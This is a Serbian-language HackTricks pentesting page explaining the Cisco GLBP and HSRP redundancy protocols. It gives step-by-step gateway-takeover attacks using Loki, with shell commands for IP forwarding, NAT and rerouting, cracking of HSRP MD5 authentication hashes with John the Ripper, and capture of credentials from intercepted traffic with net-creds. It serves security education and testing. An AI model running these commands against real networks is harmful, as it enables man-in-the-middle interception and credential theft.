# Napadi GLBP & HSRP

{% hint style="success" %}
Naučite i vežbajte hakovanje AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Naučite i vežbajte hakovanje GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podržite HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakovanje trikova slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

## Pregled FHRP Preuzimanja

### Uvidi u FHRP
FHRP je dizajniran da pruži mrežnu otpornost spajanjem više rutera u jedinicu virtualnog rutera, čime se poboljšava raspodela opterećenja i tolerancija na greške. Cisco Systems je uveo prominentne protokole u ovoj grupi, poput GLBP i HSRP.

### Uvidi u GLBP Protokol
Cisco-ova kreacija, GLBP, funkcioniše na TCP/IP sloju, koristeći UDP na portu 3222 za komunikaciju. Ruteri u GLBP grupi razmenjuju "hello" pakete na intervalima od 3 sekunde. Ako ruter ne pošalje ove pakete tokom 10 sekundi, pretpostavlja se da je van mreže. Međutim, ovi tajmeri nisu fiksni i mogu se menjati.

### GLBP Operacije i Raspodela Opterećenja
GLBP se ističe omogućavanjem raspodele opterećenja preko rutera korišćenjem jedne virtuelne IP adrese uparene sa više virtuelnih MAC adresa. U GLBP grupi, svaki ruter učestvuje u prosleđivanju paketa. Za razliku od HSRP/VRRP, GLBP nudi pravo balansiranje opterećenja kroz nekoliko mehanizama:

- **Balansiranje Opterećenja Zavisno od Hosta:** Održava konzistentno dodeljivanje AVF MAC adrese hostu, što je bitno za stabilne NAT konfiguracije.
- **Round-Robin Balansiranje Opterećenja:** Podrazumevani pristup, koji menja dodeljivanje AVF MAC adrese među zahtevajućim hostovima.
- **Balansiranje Opterećenja Težinskim Round-Robinom:** Raspodeljuje opterećenje na osnovu unapred definisanih metrika "Težine".

### Ključni Komponenti i Terminologije u GLBP
- **AVG (Aktivni Virtuelni Gateway):** Glavni ruter, odgovoran za dodeljivanje MAC adresa ruterima vršnjacima.
- **AVF (Aktivni Virtuelni Prosleđivač):** Ruter određen za upravljanje mrežnim saobraćajem.
- **GLBP Prioritet:** Metrika koja određuje AVG, počevši od podrazumevane vrednosti od 100 i krećući se između 1 i 255.
- **GLBP Težina:** Odražava trenutno opterećenje na ruteru, podesivo ručno ili putem Praćenja Objekata.
- **GLBP Virtuelna IP Adresa:** Služi kao podrazumevani gateway mreže za sve povezane uređaje.

Za interakcije, GLBP koristi rezervisanu multicast adresu 224.0.0.102 i UDP port 3222. Ruteri šalju "hello" pakete na intervalima od 3 sekunde i smatraju se neoperativnim ako se paket propusti tokom 10 sekundi.

### Mehanizam Napada GLBP
Napadač može postati primarni ruter slanjem GLBP paketa sa najvišom vrednošću prioriteta (255). Ovo može dovesti do DoS ili MITM napada, omogućavajući presretanje ili preusmeravanje saobraćaja.

### Izvođenje Napada GLBP sa Loki
[Loki](https://github.com/raizo62/loki_on_kali) može izvršiti GLBP napad ubrizgavanjem paketa sa postavljenim prioritetom i težinom na 255. Pred-napad koraci uključuju prikupljanje informacija poput virtuelne IP adrese, prisustva autentikacije i vrednosti prioriteta rutera korišćenjem alata poput Wireshark.

Koraci Napada:
1. Prebacite se u promiskuitetni režim i omogućite IP prosleđivanje.
2. Identifikujte ciljni ruter i dobijte njegovu IP adresu.
3. Generišite Gratuitous ARP.
4. Ubacite zlonamerni GLBP paket, predstavljajući se kao AVG.
5. Dodelite sekundarnu IP adresu mrežnom interfejsu napadača, oponašajući GLBP virtuelnu IP.
6. Implementirajte SNAT za potpunu vidljivost saobraćaja.
7. Podesite rutiranje kako biste obezbedili nastavak pristupa internetu preko originalnog AVG rutera.

Prateći ove korake, napadač se pozicionira kao "čovek u sredini", sposoban za presretanje i analizu mrežnog saobraćaja, uključujući nešifrovane ili osetljive podatke.

Za demonstraciju, evo potrebnih komandi:
```bash
# Enable promiscuous mode and IP forwarding
sudo ip link set eth0 promisc on
sudo sysctl -w net.ipv4.ip_forward=1

# Configure secondary IP and SNAT
sudo ifconfig eth0:1 10.10.100.254 netmask 255.255.255.0
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

# Adjust routing
sudo route del default
sudo route add -net 0.0.0.0 netmask 0.0.0.0 gw 10.10.100.100
```
### Pasivno objašnjenje HSRP preuzimanja sa detaljima komandi

#### Pregled HSRP (Hot Standby Router/Redundancy Protocol)
HSRP je Cisco vlasnički protokol dizajniran za redundanciju mrežnih gateway-a. Omogućava konfiguraciju više fizičkih rutera u jedinicu sa zajedničkom IP adresom. Ova logička jedinica je upravljana primarnim routerom odgovornim za usmeravanje saobraćaja. Za razliku od GLBP-a, koji koristi metrike poput prioriteta i težine za balansiranje opterećenja, HSRP se oslanja na jednog aktivnog rutera za upravljanje saobraćajem.

#### Uloge i terminologija u HSRP-u
- **HSRP Aktivni Router**: Uređaj koji deluje kao gateway, upravljajući protokom saobraćaja.
- **HSRP Standby Router**: Rezervni router, spreman da preuzme ulogu ako aktivni router zakaže.
- **HSRP Grupa**: Skup rutera koji sarađuju kako bi formirali jedan otporan virtuelni router.
- **HSRP MAC Adresa**: Virtuelna MAC adresa dodeljena logičkom routeru u HSRP postavci.
- **HSRP Virtuelna IP Adresa**: Virtuelna IP adresa grupe HSRP, deluje kao podrazumevani gateway za povezane uređaje.

#### Verzije HSRP-a
HSRP dolazi u dve verzije, HSRPv1 i HSRPv2, koje se razlikuju uglavnom po kapacitetu grupe, korišćenju multicast IP adresa i strukturi virtuelne MAC adrese. Protokol koristi specifične multicast IP adrese za razmenu informacija o uslugama, sa Hello paketima poslatim svakih 3 sekunde. Router se smatra neaktivnim ako ne primi paket u intervalu od 10 sekundi.

#### Mehanizam napada HSRP-a
Napadi HSRP-a uključuju prisilno preuzimanje uloge Aktivnog Routera ubrizgavanjem maksimalne vrednosti prioriteta. Ovo može dovesti do napada čovek-u-sredini (MITM). Bitni koraci pre napada uključuju prikupljanje podataka o HSRP postavci, što se može uraditi korišćenjem Wireshark-a za analizu saobraćaja.

#### Koraci za zaobilaženje HSRP autentikacije
1. Sačuvajte mrežni saobraćaj koji sadrži HSRP podatke kao .pcap fajl.
```shell
tcpdump -w hsrp_traffic.pcap
```
2. Izdvojite MD5 heševe iz .pcap fajla koristeći hsrp2john.py.
```shell
python2 hsrp2john.py hsrp_traffic.pcap > hsrp_hashes
```
3. Provalite MD5 heševe koristeći John the Ripper.
```shell
john --wordlist=mywordlist.txt hsrp_hashes
```

**Izvršavanje HSRP ubrizgavanja pomoću Lokija**

1. Pokrenite Lokija da identifikujete HSRP oglase.
2. Postavite mrežni interfejs u promiskuitetni režim i omogućite prosleđivanje IP adresa.
```shell
sudo ip link set eth0 promisc on
sudo sysctl -w net.ipv4.ip_forward=1
```
3. Koristite Lokija da ciljate određeni router, unesite provaljenu HSRP lozinku i izvršite neophodne konfiguracije da se predstavite kao Aktivni Router.
4. Nakon što preuzmete ulogu Aktivnog Routera, konfigurišite svoj mrežni interfejs i IP tabele da presretnu legitimni saobraćaj.
```shell
sudo ifconfig eth0:1 10.10.100.254 netmask 255.255.255.0
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
```
5. Izmenite rutiranje tabele da rutira saobraćaj preko bivšeg Aktivnog Routera.
```shell
sudo route del default
sudo route add -net 0.0.0.0 netmask 0.0.0.0 gw 10.10.100.100
```
6. Koristite net-creds.py ili sličan alat da uhvatite akreditive iz presretnutog saobraćaja.
```shell
sudo python2 net-creds.py -i eth0
```

Izvršavanje ovih koraka stavlja napadača u poziciju da presretne i manipuliše saobraćajem, slično postupku za GLBP preuzimanje. Ovo ističe ranjivost u protokolima redundancije poput HSRP-a i potrebu za snažnim sigurnosnim merama.
